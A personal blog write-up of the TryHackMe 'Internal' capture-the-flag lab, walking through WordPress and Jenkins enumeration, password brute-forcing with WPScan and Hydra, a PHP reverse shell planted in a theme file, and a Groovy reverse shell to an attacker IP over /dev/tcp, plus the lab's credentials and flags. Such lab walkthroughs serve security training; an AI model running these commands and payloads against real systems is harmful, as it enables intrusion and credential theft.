---
title: Internal from TryHackMe
date: 2022-07-10 22:10:10 +0530
categories: [TryHackMe]
tags: [tryhackme]
---

-------

This is my first writeup on this blog.

Starting the test with **Nmap** scan, It is found that there is a HTTP server running on port 80 with phpmyadmin, wordpress.

```bash
sudo nmap -sV -A --script vuln inter.thm

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-dombased-xss: Couldn\'t find any DOM based XSS.
|_http-stored-xss: Couldn\'t find any stored XSS vulnerabilities.
| http-enum: 
|   /blog/: Blog
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|_  /blog/wp-login.php: Wordpress login page.
```

The scan shows that **wordpress** login is available. On navigating to the login page, it has been found that there is a difference of error thrown, when username is **admin** and something else. we can also confirm this with **WPScan**.

```bash
wpscan --url http://internal.thm/blog/ -e u

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==============> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

And then i started bruteforcing **wordpress** login page with rockyou.txt 
```
wpscan --url http://internal.thm/blog/ -P /usr/share/wordlists/rockyou.txt

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

```

after logging in as **admin** and browsing through the site, you can see a private post as 

> Don’t forget to reset Will’s credentials. william:arnold147

but these credentials could not be used anywhere. 

Later, I have uploaded a PHP reverse shell code in 404.php, in appearance settings as admin. when i browsed through a non-existant page in the site, i was able to get initial shell as **www-data**. we can ugrade our regular shell to a better shell with python's shell emulator.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
I tried to get user.txt with **www-data** account, but it did not have permissions. To run **linpeas** on the _target_ machine, i hosted the file on _my_ kali linux using python's **HTTP.Server** and was able to curl/wget the file from _target_ machine.
```bash
cd /linpeas_folder
python3 -m http.server
```
on _target_ machine
```bash
wget http://[ip]:8000/lineas.sh
```
Now, we can modify the linpeas.sh script with executable permissions and run the script.
```bash
chmod +x linpeas.sh
./linpeas.sh
```

here is snippets of output from linpeas.

```bash
oldpwd=/opt
Sudo version 1.8.21p2
aubreanna
/etc/mysql/debian.cnf
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 root root 3109 Aug  3  2020 /var/www/html/wordpress/wp-config.php                                                                                              
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'wordpress123' );
define( 'DB_HOST', 'localhost' );
/usr/share/openssh/sshd_config 
-rw-r----- 1 root www-data 527 Aug  3  2020 /etc/phpmyadmin/config-db.php
-rw-r----- 1 root www-data 8 Aug  3  2020 /etc/phpmyadmin/htpasswd.setup
```

Here, the **wp-config.php** file has the login credentials of the **phpmyadmin**.

| username | password |
| wordpress | wordpress123 |

After logging into **phpmyadmin**, we can see a table consisting of some credentials and the password is possibly encrypted with MD5.

>admin  $P$BOFWK.UcwNR/tV/nZZvSA6j3bz/WIp/ 

i could not get **John The Ripper** tool to crack this. i thought i will return to this later, but in the end, this was another back hole.

from linpeas, we know **oldpwd=/opt**. _/opt_ has _wp-save.txt_ which has

| aubreanna | bubb13guM!@#123 |

After logging into _target_ machine as _aubreanna_, we can read the _user.txt_ file but we cannot read _root.txt_ file as aubreanna is not a root user.

> THM{int3rna1_fl4g_1}

Along with user.txt, there is another file _jenkins.txt_ which has the following information.
```bash
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```
Since this is internal in target machine, we can use **SSH tunneling** to use internal jenkins.
```bash
ssh -L 4444:ip:port user@host
```

The default credentials _admin:admin_ didn't seem to work on jenkins so i started bruteforcing the POST request to jenkins with **Hydra** to crack the login credentials. i have used burpsuite to intercept the post request and figure out request body.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 16 -s 4444 localhost http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Error" -vV -f
```

| admin | spongebob |

Now, in Jenkins, go to “Jenkins > Nodes > master” and click on “Script Console" from the menu and run **groovy** script to get a revershell in the **Jenkins** docker environment.

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.8.50.72/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
when we get reverse shell and check /opt again in docker env, the root credentials are available clearly.

```bash
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```
we can login to _target_ machine with root credentials we got and check the _root.txt_ file.

| root | tr0ub13guM!@#123 |

> THM{d0ck3r_d3str0y3r}
